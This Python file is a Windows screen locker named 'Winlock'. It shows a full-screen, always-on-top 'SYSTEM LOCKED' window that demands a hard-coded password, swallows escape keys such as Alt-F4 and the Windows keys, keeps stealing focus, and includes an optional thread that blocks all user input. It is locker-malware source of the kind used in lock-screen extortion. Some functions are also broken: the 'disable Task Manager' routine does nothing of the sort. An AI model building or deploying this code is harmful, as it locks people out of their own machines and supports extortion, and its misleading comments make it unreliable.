import tkinter as tk
import ctypes
import sys
import os
import threading

# ---------- Windows API ----------
user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32

# Disable task manager, alt+f4, ctrl+alt+del (partially), etc.
def disable_taskmgr():
    try:
        ctypes.windll.ntdll.RtlAdjustPrivilege(9, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.RtlAdjustPrivilege(10, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.RtlAdjustPrivilege(11, 1, 0, ctypes.byref(ctypes.c_bool()))
    except Exception:
        pass
    try:
        kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 0)
    except Exception:
        pass

def block_keys():
    # Block task manager, alt+f4, windows keys, ctrl+esc, etc.
    for key in (0x12, 0x73, 0x5B, 0x5C, 0x1B):  # ALT, F4, LWIN, RWIN, ESC
        user32.RegisterHotKey(None, key, 0, key)

def set_topmost(root):
    root.attributes("-topmost", True)
    root.overrideredirect(True)
    root.lift()
    root.focus_force()

def fullscreen(root):
    root.attributes("-fullscreen", True)
    root.geometry(f"{user32.GetSystemMetrics(0)}x{user32.GetSystemMetrics(1)}+0+0")

# ---------- Lock Screen ----------
class Winlock:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("Locked")
        self.root.configure(bg="black")
        self.root.attributes("-fullscreen", True)
        self.root.attributes("-topmost", True)
        self.root.overrideredirect(True)
        self.root.protocol("WM_DELETE_WINDOW", self.disable_close)
        fullscreen(self.root)

        # Block common escape keys
        self.root.bind("<Alt-F4>", lambda e: "break")
        self.root.bind("<Escape>", lambda e: "break")
        self.root.bind("<Control-Escape>", lambda e: "break")
        self.root.bind("<Super_L>", lambda e: "break")
        self.root.bind("<Super_R>", lambda e: "break")
        self.root.bind("<F4>", lambda e: "break")

        # UI
        label = tk.Label(
            self.root,
            text="SYSTEM LOCKED\n\nEnter password to unlock:",
            fg="red",
            bg="black",
            font=("Courier", 32, "bold"),
            justify="center",
        )
        label.pack(expand=True, pady=40)

        self.entry = tk.Entry(
            self.root,
            show="*",
            font=("Courier", 24),
            bg="#111",
            fg="lime",
            insertbackground="lime",
            justify="center",
            width=20,
        )
        self.entry.pack(pady=20)
        self.entry.focus_force()

        self.entry.bind("<Return>", self.check_password)

        # Keep focus
        self.root.after(100, self.keep_focus)

    def disable_close(self):
        pass

    def keep_focus(self):
        try:
            self.root.focus_force()
            self.entry.focus_force()
            self.root.lift()
            self.root.attributes("-topmost", True)
        except Exception:
            pass
        self.root.after(500, self.keep_focus)

    def check_password(self, event=None):
        if self.entry.get() == "unlock123":  # change this
            self.root.destroy()
            sys.exit(0)
        else:
            self.entry.delete(0, tk.END)
            self.root.configure(bg="darkred")
            self.root.after(200, lambda: self.root.configure(bg="black"))

    def run(self):
        self.root.mainloop()

# ---------- Input Blocker Thread ----------
def block_input_thread():
    while True:
        try:
            # Block left/right mouse buttons and most keys
            user32.BlockInput(True)
        except Exception:
            pass
        threading.Event().wait(0.1)

# ---------- Main ----------
if __name__ == "__main__":
    disable_taskmgr()
    block_keys()

    # Uncomment if you want to block input entirely
    # threading.Thread(target=block_input_thread, daemon=True).start()

    lock = Winlock()
    lock.run()
